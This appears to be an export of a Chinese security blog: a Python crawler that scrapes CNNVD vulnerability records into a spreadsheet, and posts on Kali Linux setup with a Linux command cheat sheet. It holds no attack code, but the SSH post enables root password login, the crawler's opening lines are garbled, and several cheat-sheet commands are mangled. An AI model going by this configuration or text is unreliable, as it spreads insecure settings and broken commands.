123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348#!/usr#import urllib.request/bin/env python3# -*- coding: utf-8 -*-import urllib.requestfrom urllib import parsefrom bs4 import BeautifulSoupimport http.cookiejarimport xlwtimport zlibimport reimport timeimport xlsxwriterimport sysimport datetimeimport pymysql'''运行方法：python vulnerabilities_crawler 2017-10-01 2017-10-07 178第一个为开始时间，第二个为结束时间，第三个为总页数。'''#获得漏洞详情链接列表def vulnerabilities_url_list(url,start_time,end_time): header = &#123; 'User-Agent': 'Mozilla/5.0 (Linux; Android 4.1.2; Nexus 7 Build/JZ054K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19', 'Accept-Encoding': 'gzip, deflate', 'Referer': 'http://cnnvd.org.cn/web/vulnerability/queryLds.tag' &#125; data = &#123; 'qstartdate':'2017-10-30', #---------------》开始日期 'qenddate':'2017-10-31' #---------------》结束日期 &#125; data['qstartdate'] = start_time data['qenddate'] = end_time data = parse.urlencode(data).encode('utf-8') vulnerabilities_url_html = urllib.request.Request(url,headers=header,data=data) vulnerabilities_url_cookie = http.cookiejar.CookieJar() vulnerabilities_url_opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(vulnerabilities_url_cookie)) vulnerabilities_url_html = vulnerabilities_url_opener.open(vulnerabilities_url_html) vulnerabilities_url_html = zlib.decompress(vulnerabilities_url_html.read(), 16+zlib.MAX_WBITS) vulnerabilities_url_html = vulnerabilities_url_html.decode() #提取漏洞详情链接 response = r'href="(.+?)" target="_blank" class="a_title2"' vulnerabilities_link_list = re.compile(response).findall(vulnerabilities_url_html) #添加http前序 i = 0 for link in vulnerabilities_link_list: vulnerabilities_lists.append('http://cnnvd.org.cn'+vulnerabilities_link_list[i]) i+=1 print("已完成爬行第%d个漏洞链接"%i) time.sleep(0.2)#漏洞信息爬取函数def vulnerabilities_data(url): header = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0', 'Accept-Encoding': 'gzip, deflate, sdch', &#125; vulnerabilities_data_html = urllib.request.Request(url,headers=header) vulnerabilities_data_cookie = http.cookiejar.CookieJar() vulnerabilities_data_opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(vulnerabilities_data_cookie)) vulnerabilities_data_html = vulnerabilities_data_opener.open(vulnerabilities_data_html) vulnerabilities_data_html = zlib.decompress(vulnerabilities_data_html.read(), 16+zlib.MAX_WBITS) vulnerabilities_data_html = vulnerabilities_data_html.decode() global vulnerabilities_result_list vulnerabilities_result_list=[] #抓取信息列表命名 #添加漏洞信息详情 vulnerabilities_detainled_soup1 = BeautifulSoup(vulnerabilities_data_html,'html.parser') vulnerabilities_detainled_data = vulnerabilities_detainled_soup1.find('div',attrs=&#123;'class':'detail_xq w770'&#125;) ##定义 漏洞信息详情 块的soup vulnerabilities_detainled_data = vulnerabilities_detainled_data.decode() vulnerabilities_detainled_soup = BeautifulSoup(vulnerabilities_detainled_data,'html.parser') #二次匹配 vulnerabilities_detainled_data_list = vulnerabilities_detainled_soup.find_all('li') #标签a信息汇总 try: vulnerabilities_name = vulnerabilities_detainled_soup.h2.string #漏洞名称 except: vulnerabilities_name = '' vulnerabilities_result_list.append(vulnerabilities_name) try: vulnerabilities_cnnvd_num = vulnerabilities_detainled_soup.span.string #cnnvd编号 vulnerabilities_cnnvd_num = re.findall(r"\：([\s\S]*)",vulnerabilities_cnnvd_num)[0] except: vulnerabilities_cnnvd_num = '' vulnerabilities_result_list.append(vulnerabilities_cnnvd_num) try: #漏洞等级 vulnerabilities_rank = vulnerabilities_detainled_soup.a.decode() vulnerabilities_rank = re.search(u'([\u4e00-\u9fa5]+)',vulnerabilities_rank).group(0) except: vulnerabilities_rank = '' vulnerabilities_result_list.append(vulnerabilities_rank) vulnerabilities_cve_html = vulnerabilities_detainled_data_list[2].decode() #漏洞cve编号 vulnerabilities_cve_soup = BeautifulSoup(vulnerabilities_cve_html,'html.parser') try: vulnerabilities_cve = vulnerabilities_cve_soup.a.string vulnerabilities_cve = vulnerabilities_cve.replace("\r","").replace("\t","").replace("\n","").replace(" ","") except: vulnerabilities_cve = '' vulnerabilities_result_list.append(vulnerabilities_cve) vulnerabilities_type_html = vulnerabilities_detainled_data_list[3].decode() #漏洞类型 vulnerabilities_type_soup = BeautifulSoup(vulnerabilities_type_html,'html.parser') try: vulnerabilities_type = vulnerabilities_type_soup.a.string vulnerabilities_type = vulnerabilities_type.replace("\r","").replace("\t","").replace("\n","").replace(" ","") except: vulnerabilities_type = '' vulnerabilities_result_list.append(vulnerabilities_type) vulnerabilities_time_html = vulnerabilities_detainled_data_list[4].decode() #发布时间 vulnerabilities_time_soup = BeautifulSoup(vulnerabilities_time_html,'html.parser') try: vulnerabilities_time = vulnerabilities_time_soup.a.string vulnerabilities_time = vulnerabilities_time.replace("\r","").replace("\t","").replace("\n","") except: vulnerabilities_time = '' vulnerabilities_result_list.append(vulnerabilities_time) vulnerabilities_attack_html = vulnerabilities_detainled_data_list[5].decode() #威胁类型 vulnerabilities_attack_soup = BeautifulSoup(vulnerabilities_attack_html,'html.parser') try: vulnerabilities_attack = vulnerabilities_attack_soup.a.string vulnerabilities_attack = vulnerabilities_attack.replace("\r","").replace("\t","").replace("\n","") except: vulnerabilities_attack = '' vulnerabilities_result_list.append(vulnerabilities_attack) vulnerabilities_update_html = vulnerabilities_detainled_data_list[6].decode() #更新时间 vulnerabilities_update_soup = BeautifulSoup(vulnerabilities_update_html,'html.parser') try: vulnerabilities_update = vulnerabilities_update_soup.a.string vulnerabilities_update = vulnerabilities_update.replace("\r","").replace("\t","").replace("\n","") except: vulnerabilities_update = '' vulnerabilities_result_list.append(vulnerabilities_update) vulnerabilities_firm_html = vulnerabilities_detainled_data_list[7].decode() #厂商 vulnerabilities_firm_soup = BeautifulSoup(vulnerabilities_firm_html,'html.parser') try: vulnerabilities_firm = vulnerabilities_firm_soup.a.string vulnerabilities_firm = vulnerabilities_firm.replace("\r","").replace("\t","").replace("\n","") except: vulnerabilities_firm = '' vulnerabilities_result_list.append(vulnerabilities_firm) vulnerabilities_source_html = vulnerabilities_detainled_data_list[8].decode() #漏洞来源 vulnerabilities_source_soup = BeautifulSoup(vulnerabilities_source_html,'html.parser') try: vulnerabilities_source = vulnerabilities_source_soup.a.string vulnerabilities_source = vulnerabilities_source.replace("\r","").replace("\t","").replace("\n","") except: vulnerabilities_source = '' vulnerabilities_result_list.append(vulnerabilities_source) #添加漏洞简介详情 vulnerabilities_title_html = vulnerabilities_detainled_soup1.find('div',attrs=&#123;'class':'d_ldjj'&#125;) #定义 漏洞简介 块的soup vulnerabilities_title_html = vulnerabilities_title_html.decode() vulnerabilities_title_soup2 = BeautifulSoup(vulnerabilities_title_html,'html.parser') try: vulnerabilities_titles1 = vulnerabilities_title_soup2.find_all(name='p')[0].string vulnerabilities_titles2 = vulnerabilities_title_soup2.find_all(name='p')[1].string vulnerabilities_titles = vulnerabilities_titles1 + vulnerabilities_titles2 vulnerabilities_titles = vulnerabilities_titles.replace(' ','').replace('\t','').replace('\r','').replace('\n','') except: vulnerabilities_titles = '' vulnerabilities_result_list.append(vulnerabilities_titles) #漏洞公告 vulnerabilities_notice_html = vulnerabilities_detainled_soup1.find('div',attrs=&#123;'class':'d_ldjj m_t_20'&#125;) #定义 漏洞公告 块的soup vulnerabilities_notice_html = vulnerabilities_notice_html.decode() vulnerabilities_notice_soup2 = BeautifulSoup(vulnerabilities_notice_html,'html.parser') try: vulnerabilities_notice1 = vulnerabilities_notice_soup2.find_all(name='p')[0].string vulnerabilities_notice2 = vulnerabilities_notice_soup2.find_all(name='p')[1].string vulnerabilities_notice = vulnerabilities_notice1+vulnerabilities_notice2 vulnerabilities_notice = vulnerabilities_notice.replace('\n','').replace('\r','').replace('\t','') except: vulnerabilities_notice = '' vulnerabilities_result_list.append(vulnerabilities_notice) #参考网址 vulnerabilities_reference_html = vulnerabilities_detainled_soup1.find_all('div',attrs=&#123;'class':'d_ldjj m_t_20'&#125;)[1] #定义 参考网址 块的soup vulnerabilities_reference_html = vulnerabilities_reference_html.decode() vulnerabilities_reference_soup2 = BeautifulSoup(vulnerabilities_reference_html,'html.parser') try: vulnerabilities_reference = vulnerabilities_reference_soup2.find_all(name='p')[1].string vulnerabilities_reference = vulnerabilities_reference.replace('\n','').replace('\r','').replace('\t','').replace('链接:','') except: vulnerabilities_reference = '' vulnerabilities_result_list.append(vulnerabilities_reference) #受影响实体 vulnerabilities_effect_html = vulnerabilities_detainled_soup1.find_all('div',attrs=&#123;'class':'d_ldjj m_t_20'&#125;)[2] #定义 受影响实体 块的soup vulnerabilities_effect_html = vulnerabilities_effect_html.decode() vulnerabilities_effect_soup2 = BeautifulSoup(vulnerabilities_effect_html,'html.parser') try: vulnerabilities_effect = vulnerabilities_effect_soup2.find_all(name='p')[0].string vulnerabilities_effect = vulnerabilities_effect.replace('\n','').replace('\r','').replace('\t','').replace(' ','') except: try: vulnerabilities_effect = vulnerabilities_effect_soup2.find_all(name='a')[0].string vulnerabilities_effect = vulnerabilities_effect.replace('\n','').replace('\r','').replace('\t','').replace(' ','') except: vulnerabilities_effect = '' vulnerabilities_result_list.append(vulnerabilities_effect) #补丁 vulnerabilities_patch_html = vulnerabilities_detainled_soup1.find_all('div',attrs=&#123;'class':'d_ldjj m_t_20'&#125;)[3] #定义 补丁 块的soup vulnerabilities_patch_html = vulnerabilities_patch_html.decode() vulnerabilities_patch_soup2 = BeautifulSoup(vulnerabilities_patch_html,'html.parser') try: vulnerabilities_patch = vulnerabilities_patch_soup2.find_all(name='p')[0].string vulnerabilities_patch = vulnerabilities_patch.replace('\n','').replace('\r','').replace('\t','').replace(' ','') except: vulnerabilities_patch = '' vulnerabilities_result_list.append(vulnerabilities_patch)#漏洞信息写入exceldef vulnerabilities_excel(excel): workbook = xlsxwriter.Workbook('vulnerabilities_data.xlsx') worksheet = workbook.add_worksheet() row = 0 col = 0 worksheet.write(row,0,'漏洞名称') worksheet.write(row,1,'CNNVD编号') worksheet.write(row,2,'危害等级') worksheet.write(row,3,'CVE编号') worksheet.write(row,4,'漏洞类型') worksheet.write(row,5,'发布时间') worksheet.write(row,6,'攻击途径') worksheet.write(row,7,'更新时间') worksheet.write(row,8,'厂商') worksheet.write(row,9,'漏洞来源') worksheet.write(row,10,'漏洞简介') worksheet.write(row,11,'漏洞公告') worksheet.write(row,12,'参考链接') worksheet.write(row,13,'受影响实体') worksheet.write(row,14,'补丁') row = 1 for i in range(len(excel)): worksheet.write(row,col,excel[i][0]) worksheet.write(row,col+1,excel[i][1]) worksheet.write(row,col+2,excel[i][2]) worksheet.write(row,col+3,excel[i][3]) worksheet.write(row,col+4,excel[i][4]) worksheet.write(row,col+5,excel[i][5]) worksheet.write(row,col+6,excel[i][6]) worksheet.write(row,col+7,excel[i][7]) worksheet.write(row,col+8,excel[i][8]) worksheet.write(row,col+9,excel[i][9]) worksheet.write(row,col+10,excel[i][10]) worksheet.write(row,col+11,excel[i][11]) worksheet.write(row,col+12,excel[i][12]) worksheet.write(row,col+13,excel[i][13]) worksheet.write(row,col+14,excel[i][14]) row += 1 workbook.close()#漏洞信息写入数据库def vulnerabilities_mysql(excel): db = pymysql.connect('127.0.0.1','root','xxxx','spider',charset='utf8') cursor = db.cursor() for i in range(len(excel)): sql="INSERT INTO cnnvd(vulnerabilities_name,cnnvd_num,vulnerabilities_rank,cve_num,vulnerabilities_type,release_time,attack_path,update_time,company,vulnerabilities_source,vulnerabilities_data,solution,reference,object,path) VALUES(%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s);" try: cursor.execute(sql,(excel[i][0],excel[i][1],excel[i][2],excel[i][3],excel[i][4],excel[i][5],excel[i][6],excel[i][7],excel[i][8],excel[i][9],excel[i][10],excel[i][11],excel[i][12],excel[i][13],excel[i][14])) except: print('写入数据库失败') print('写入数据库完毕！！！') db.commit() db.close()#爬取代理ipdef main(): #调用漏洞列表函数并获得漏洞链接列表 begin = datetime.datetime.now() global vulnerabilities_lists vulnerabilities_lists=[] j = 1 page_count = sys.argv[3] page_count = int(page_count) start_time = sys.argv[1] end_time = sys.argv[2] while j&lt;=page_count: try: vulnerabilities_url = 'http://cnnvd.org.cn/web/vulnerability/queryLds.tag?pageno=%d&amp;repairLd='%j vulnerabilities_url_list(vulnerabilities_url,start_time,end_time) print("已完成爬行第%d页"%j) print('\n') time.sleep(2) j+=1 except: print('爬取失败，等待5秒后重新爬取。') time.sleep(5) #调用漏洞信息函数并爬取漏洞信息 vulnerabilities_result_lists = [] a=0 while a &lt; len(vulnerabilities_lists): try: vulnerabilities_data(vulnerabilities_lists[a]) vulnerabilities_result_lists.append(vulnerabilities_result_list) a+=1 print("完成爬行第%d个漏洞信息"%a) time.sleep(1) except: print('爬取失败，等待5秒后重新爬取。') time.sleep(5) #漏洞信息写入excel vulnerabilities_excel(vulnerabilities_result_lists) #漏洞信息写入MySQL #vulnerabilities_mysql(vulnerabilities_result_lists) #爬行结束 end = datetime.datetime.now() total_time = end - begin print ('漏洞信息爬取结束') print ('应该爬行漏洞数量： ',len(vulnerabilities_lists)) print ('爬行时间： ',total_time)if __name__ == '__main__': main() 将代码保存为CNNVD_crawl.py,然后按win + R 输入cmd,切换到该文件的保存路径 1.2 安装第三方模块在运行的过程中需要第三方模块的支持，所以需要安装第三方模块，使用命令 1python - m pip install 第三方模块名称 0x02 使用教程1python cnnvd_crawl.py 2019-08-26 2019-08-28 26 参数说明： cnnvd_crawl.py: 为脚本文件 2019-08-26 2019-08-28：需要爬取的时间范围（需要自行在CNNVD上查看对应日期范围的总页数），中间有空格 26 : 需要爬行的页数（需要自行在CNNVD上查看对应日期范围的总页数） 示例截图： 自动生成生成的Excel表格 0x03 总结在这里谈一下脚本的优势和劣势吧 脚本优势：可以指定日期范围漏洞的爬行，真心强大 脚本劣势：爬虫爬行时，会有部分遗漏信息，所以需要在爬行完成后再手动的添加；爬虫爬行的速度不是很快，不是多线程的. 0x04 参考链接https://www.cnblogs.com/kaiho/p/7804542.html ###]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ssh连接不上kali问题]]></title>
    <url>%2F2019%2F08%2F27%2Fssh%E8%BF%9E%E6%8E%A5%E4%B8%8D%E4%B8%8Akali%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[0x00 前言很多人在虚拟机中安装kali Linux，但是可能由于自己电脑配置的问题，导致使用起来非常的卡顿，所以想用xshell这样的远程终端工具来连接kali Linux。但是问题来了，怎么连接都连接不上，ip地址，用户名和密码什么的都配置正确，so，那可能就是配置的问题了。具体方法，请看下文。 0x01 修改跟新源1vim /etc/apt/sources.list #使用vim编辑器修改 或者 1leafpad /etc/apt/sources.list #使用可视化编辑器修改（好用） 跟新源 123456789101112131415161718192021222324252627#中科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #清华大学deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙大deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freedeb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free #东软大学deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contribdeb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib #官方源deb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib #重庆大学deb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib 保存关闭，vim需要按ESC键，然后按hift+ :，输入wq，保存并退出。 1apt-get update 0x02 开启**ssh** 修改sshd_config文件，命令为 123vi /etc/ssh/sshd_config#或leafpad /etc/ssh/sshd_config 将#PasswordAuthentication no的注释去掉，并且将NO修改为YES (kali中默认是yes) 将PermitRootLogin without-password修改为PermitRootLogin yes 启动ssh服务 1service ssh start 如果还是不能链接，重启就可以了]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>kali Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali Linux在安装vmtool时碰到的问题]]></title>
    <url>%2F2019%2F08%2F27%2F%E5%9C%A8%E5%AE%89%E8%A3%85vmtool%E6%97%B6%E7%A2%B0%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[0x00 前言在kali Linux跟新到2018.2版本以后，使用虚拟机自带的vmtool进行安装 已经没有效果了，不能是屏幕适应客户端和拖拽操作，为此在网上搜了很多相关 的文档，最终找到了open-vm-tools-desktop 这个软件，下面来详细的介绍该 软件的安装 0x01 配置跟新源在终端中输入：leafpad/etc/apt/sources.list,然后添加以下跟新源 123456789#中科大跟新源deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-freedeb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free #阿里云跟新源deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb http://mirrors.aliyun.com/kali-security kali-rolling main contrib non-free 0x02 跟新系统终端输入 12apt-get update #跟新系统apt-get dist-upgrade #跟新软件 （可自己选择操作） 0x03 安装vmtool终端输入 1apt-get install open-vm-tools-desktop fuse 0x04 总结在安装vmtools这个问题上，上网百度了好久，但是没有相关的信息，最后在一个论坛中看到了，没想到还真解决了，一条命令解决问题，真是太爽了，比传统的安装方式还要方便。总之，碰到问题以后多从百度，Google中搜集相关的信息，一般情况下，你碰到的问题都会有人碰到过，这样你就可以直接使用别人的间接经验了，不过也要有选择性的，现在的互联网时代，数据大爆炸，很多时候因为一个复制粘贴别人文章的文章而踩大坑，本人也最讨厌这种直接复制别人的文章还不注明出处的人，导致看文章的人走弯路。emmm，ok，就这样结束~ ###]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>kali Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[史上最全的Linux的常用命令]]></title>
    <url>%2F2019%2F08%2F27%2F%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8%E7%9A%84Linux%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[0x00 前言本文涵盖了Linux系统的很多命令，为了方便以后查找使用，在这里记录一下。 内容均从网上摘抄。 0x01 系统信息arch显示机器的处理器架构（1） uname -m显示机器的处理器架构（2） uname -r显示正在使用的内核版本 dmidecode -q显示硬件系统部件 - （SMBIOS / DMI） hdparm -i / dev / hda罗列一个磁盘的架构特性 hdparm -tT / dev / sda在磁盘上执行测试性读取操作 cat / proc / cpuinfo显示CPU信息的信息 cat / proc / interrupts显示中断 cat / proc / meminfo校验内存使用 cat / proc / swaps显示哪些swap被使用 cat / proc / version显示内核的版本 cat / proc / net / dev显示网络适配器及统计 cat / proc / mounts显示已加载的文件系统 lspci -tv罗列PCI设备 lsusb -tv显示USB设备 日期显示系统日期 cal 2007显示2007年的日历表 date 041217002007.00设置日期和时间 - 月日时分年。秒 clock -w将时间修改保存到BIOS 关系（系统的关机，重启以及登出） shutdown -h now关闭系统（1） init 0关闭系统（2） telinit 0关闭系统（3） shutdown -h hours：minutes＆按预定时间关闭系统 shutdown -c取消按预定时间关闭系统 shutdown -r now重启（1） reboot重启（2） 注销注销 0x02 文件和目录cd / home进入’/ home’目录’ cd ..返回上一级目录 cd ../ ..返回上两级目录 cd进入个人的主目录 cd~user1进入个人的主目录 cd - 返回上次所在的目录 pwd显示工作路径 ls查看目录中的文件 ls -F查看目录中的文件 ls -l显示文件和目录的详细资料 ls -a显示隐藏文件 ls * [0-9] *显示包含数字的文件名和目录名 tree显示文件和目录由根目录开始的树形结构（1） lstree显示文件和目录由根目录开始的树形结构（2） mkdir dir1创建一个叫做’dir1’的目录’ mkdir dir1 dir2同时创建两个目录 mkdir -p / tmp / dir1 / dir2创建一个目录树 rm -f file1删除一个叫做’file1’的文件’ rmdir dir1删除一个叫做’dir1’的目录’ rm -rf dir1删除一个叫做’dir1’的目录并同时删除其内容 rm -rf dir1 dir2同时删除两个目录及它们的内容 mv dir1 new_dir重命名/移动一个目录 cp file1 file2复制一个文件 cp目录/ *。复制一个目录下的所有文件到当前工作目录 cp -a / tmp / dir1。复制一个目录到当前工作目录 cp -a dir1 dir2复制一个目录 ln -s file1 lnk1创建一个指向文件或目录的软链接 ln file1 lnk1创建一个指向文件或目录的物理链接 touch -t 0712250000 file1修改一个文件或目录的时间戳 - （YYMMDDhhmm） file file1将文件的mime类型输出为文本 iconv -l列出已知的编码 iconv -f fromEncoding -t toEncoding inputFile&gt; outputFile通过假设它在fromEncoding中编码并将其转换为toEncoding，从给定的输入文件创建一个新的。 找 。-maxdepth 1 -name * .jpg -print -exec convert“{}”-resize 80x60“thumbs / {}”; 批量调整当前目录中的文件大小并将它们发送到缩略图目录（需要从Imagemagick转换） 0x03 文件搜索find / -name file1从’/‘开始进入根文件系统搜索文件和目录 find / -user user1搜索属于用户’user1’的文件和目录 find / home / user1 -name \ * .bin在目录’/ home / user1’中搜索带有’.bin’结尾的文件 find / usr / bin -type f -atime +100搜索在过去100天内未被使用过的的执行文件 find / usr / bin -type f -mtime -10搜索在10天内被创建或者修改过的文件 find / -name \ * .rpm -exec chmod 755’{}’; 搜索以’.rpm’结尾的文件并定义其权限 find / -xdev -name \ * .rpm搜索以’.rpm’结尾的文件，忽略光驱，捷盘等可移动设备 找到\ * .ps寻找以’.ps’结尾的文件 - 先运行’updatedb’命令 whereis halt显示一个二进制文件，源码或man的位置 停止显示一个二进制文件或可执行文件的完整路径 0x04 挂载一个文件系统mount / dev / hda2 / mnt / hda2挂载一个叫做hda2的盘 - 确定目录’/ mnt / hda2’已经存在 umount / dev / hda2卸载一个叫做hda2的盘 - 先从挂载点’/ mnt / hda2’退出 fuser -km / mnt / hda2当设备繁忙时强制卸载 umount -n / mnt / hda2运行卸载操作而不写入/ etc / mtab文件 - 当文件为只读或当磁盘写满时非常有用 mount / dev / fd0 / mnt / floppy挂载一个软盘 mount / dev / cdrom / mnt / cdrom挂载一个cdrom或dvdrom mount / dev / hdc / mnt / cdrecorder挂载一个cdrw或dvdrom mount / dev / hdb / mnt / cdrecorder挂载一个cdrw或dvdrom mount -o loop file.iso / mnt / cdrom挂载一个文件或ISO镜像文件 mount -t vfat / dev / hda5 / mnt / hda5挂载一个Windows FAT32文件系统 mount / dev / sda1 / mnt / usbdisk挂载一个usb捷盘或闪存设备 mount -t smbfs -o username = user，password = pass // WinClient / share / mnt / share挂载一个windows网络共享 0x05 磁盘空间df -h显示已经挂载的分区列表 ls -lSr | more以尺寸大小排列文件和目录 du -sh dir1估算目录’dir1’已经使用的磁盘空间’ du -sk * | sort -rn以容量大小为依据依次显示文件和目录的大小 rpm -q -a –qf’％10 {SIZE} t％{NAME} n’| sort -k1,1n以大小为依据依次显示已安装的rpm包所使用的空间（fedora，redhat类系统） dpkg-query -W -f =’$ {Installed-Size; 10} t $ {Package} n’| sort -k1,1n以大小为依据显示已安装的deb包所使用的空间（ubuntu，debian类系统） 0x06 用户和群组groupadd group_name创建一个新用户组 groupdel group_name删除一个用户组 groupmod -n new_group_name old_group_name重命名一个用户组 useradd -c“名字姓氏”-g admin -d / home / user1 -s / bin / bash user1创建一个属于“admin”用户组的用户 useradd user1创建一个新用户 userdel -r user1删除一个用户（’-r’排除主目录） usermod -c“用户FTP”-g system -d / ftp / user1 -s / bin / nologin user1修改用户属性 passwd修改口令 passwd user1修改一个用户的口令（只允许root执行） chage -E 2005-12-31 user1设置用户口令的失效期限 pwck检查’/ etc / passwd’的文件格式和语法修正以及存在的用户 grpck检查’/ etc / passwd’的文件格式和语法修正以及存在的群组 newgrp group_name登陆进一个新的群组以改变新创建文件的预设群组 0x07 文件的权限 使用“+”设置权限，使用“ - ”用于取消 ls -lh显示权限 ls / tmp | pr -T5 -W $ COLUMNS将终端划分成5栏显示 chmod ugo + rwx directory1设置目录的所有人（u），群组（g）以及其他人（o）以读（r），写（w）和执行（x）的权限 chmod go-rwx directory1删除群组（g）与其他人（o）对目录的读写执行权限 chown user1 file1改变一个文件的所有人属性 chown -R user1 directory1改变一个目录的所有人属性并同时改变改目录下所述文件的属性 chgrp group1 file1改变文件的群组 chown user1：group1 file1改变一个文件的所有人和群组属性 find / -perm -u + s罗列一个系统中所有使用了SUID控制的文件 chmod u + s / bin / file1设置一个二进制文件的SUID位 - 运行该文件的用户也被赋予和所有者同样的权限 chmod us / bin / file1禁用一个二进制文件的SUID位 chmod g + s / home / public设置一个目录的SGID位 - 类似SUID，不过这是针对目录的 chmod gs / home / public禁用一个目录的SGID位 chmod o + t / home / public设置一个文件的STIKY位 - 只允许合法所有人删除文件 chmod ot / home / public禁用一个目录的STIKY位 0x08 文件的特殊属性 使用“+”设置权限，使用“ - ”用于取消 chattr + a file1只允许以追加方式读写文件 chattr + c file1允许这个文件能被内核自动压缩/解压 chattr + d file1在进行文件系统备份时，dump程序将忽略这个文件 chattr + i file1设置成不可变的文件，不能被删除，修改，重命名或者链接 chattr + s file1允许一个文件被安全地删除 chattr + S file1一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘 chattr + u file1若文件被删除，系统会允许你在以后恢复这个被删除的文件 lsattr显示特殊的属性 0x07 打包和压缩文件bunzip2 file1.bz2解压一个叫做’file1.bz2’的文件 bzip2 file1压缩一个叫做’file1’的文件 gunzip file1.gz解压一个叫做’file1.gz’的文件 gzip file1压缩一个叫做’file1’的文件 gzip -9 file1最大程度压缩 rar a file1.rar test_file创建一个叫做’file1.rar’的包 rar a file1.rar file1 file2 dir1同时压缩’file1’，’file2’以及目录’dir1’ rar x file1.rar解压rar包 unrar x file1.rar解压rar包 tar -cvf archive.tar file1创建一个非压缩的tarball tar -cvf archive.tar file1 file2 dir1创建一个包含了’file1’，’file2’以及’dir1’的档案文件 tar -tf archive.tar显示一个包中的内容 tar -xvf archive.tar释放一个包 tar -xvf archive.tar -C / tmp将压缩包释放到/ tmp目录下 tar -cvfj archive.tar.bz2 dir1创建一个bzip2格式的压缩包 tar -xvfj archive.tar.bz2解压一个bzip2格式的压缩包 tar -cvfz archive.tar.gz dir1创建一个gzip格式的压缩包 tar -xvfz archive.tar.gz解压一个gzip格式的压缩包 zip file1.zip file1创建一个zip格式的压缩包 zip -r file1.zip file1 file2 dir1将几个文件和目录同时压缩成一个zip格式的压缩包 unzipfile1.zip解压一个zip格式压缩包 0x08 RPM包 - （Fedora，Redhat及类似系统）rpm -ivh package.rpm安装一个rpm包 rpm -ivh –nodeeps package.rpm安装一个rpm包而忽略依赖关系警告 rpm -U package.rpm更新一个rpm包但不改变其配置文件 rpm -F package.rpm更新一个确定已经安装的rpm包 rpm -e package_name.rpm删除一个rpm包 rpm -qa显示系统中所有已经安装的rpm包 rpm -qa | grep httpd显示所有名称中包含“httpd”字样的rpm包 rpm -qi package_name获取一个已安装包的特殊信息 rpm -qg“System Environment / Daemons”显示一个组件的rpm包 rpm -ql package_name显示一个已经安装的rpm包提供的文件列表 rpm -qc package_name显示一个已经安装的rpm包提供的配置文件列表 rpm -q package_name –whatrequires显示与一个rpm包存在依赖关系的列表 rpm -q package_name –whatprovides显示一个rpm包所占的体积 rpm -q package_name –scripts显示在安装/删除期间所执行的脚本l rpm -q package_name –changelog显示一个rpm包的修改历史 rpm -qf /etc/httpd/conf/httpd.conf确认所给的文件由哪个rpm包所提供 rpm -qp package.rpm -l显示由一个尚未安装的rpm包提供的文件列表 rpm –import / media / cdrom / RPM-GPG-KEY导入公司数字证书 rpm –checksig package.rpm确认一个rpm包的完整性 rpm -qa gpg-pubkey确认已安装的所有rpm包的完整性 rpm -V package_name检查文件尺寸，许可，类型，所有者，群组，MD5检查以及最后修改时间 rpm -Va检查系统中所有已安装的rpm包 - 小心使用 rpm -Vp package.rpm确认一个rpm包还未安装 rpm2cpio package.rpm | cpio –extract –make-directories * bin *从一个rpm包运行可执行文件 rpm -ivh /usr/src/redhat/RPMS/arch/package.rpm从一个rpm源码安装一个构建好的包 rpmbuild –rebuild package_name.src.rpm从一个rpm源码构建一个rpm包 0x09 YUM软件包升级器 - （Fedora，RedHat及类似系统）yum install package_name下载并安装一个rpm包 yum localinstall package_name.rpm将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系 yum update package_name.rpm更新当前系统中所有安装的rpm包 yum update package_name更新一个rpm包 yum remove package_name删除一个rpm包 yum list列出当前系统中安装的所有包 yum search package_name在rpm仓库中搜寻软件包 yum clean 